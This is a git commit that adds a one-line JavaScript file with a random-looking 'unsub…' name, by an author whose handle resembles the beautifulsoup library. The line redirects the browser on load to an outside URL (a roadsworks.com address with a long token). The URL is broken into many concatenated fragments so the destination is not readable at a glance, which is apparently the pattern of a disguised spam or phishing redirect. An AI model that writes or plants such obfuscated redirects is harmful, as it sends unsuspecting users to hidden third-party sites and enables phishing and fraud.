9617d0f9fc4fc316a63825c286e072e7894b5691
beautifulsoupz <77855946+pythonliss@users.noreply.github.com>
2022-12-01 14:45:55 +0100

    Create unsubjgslfgwlfdgalskjgdlksgdlik.js

---
+++ unsubjgslfgwlfdgalskjgdlksgdlik.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`htt`,`ps://www.`,`roads`,`work`,`s.com/V0`,`p0ljJE`,`cXB`,`Boh1`,`Zf2-7c3b2F8`,`Hx4ZmOs`,`hRpKFJ`,`L7Sg0ie3`,`Ste_lpQBdx`,`5AMK6`,`zFVc868wVNqWCr`,`N37Ou31lDA~~`))
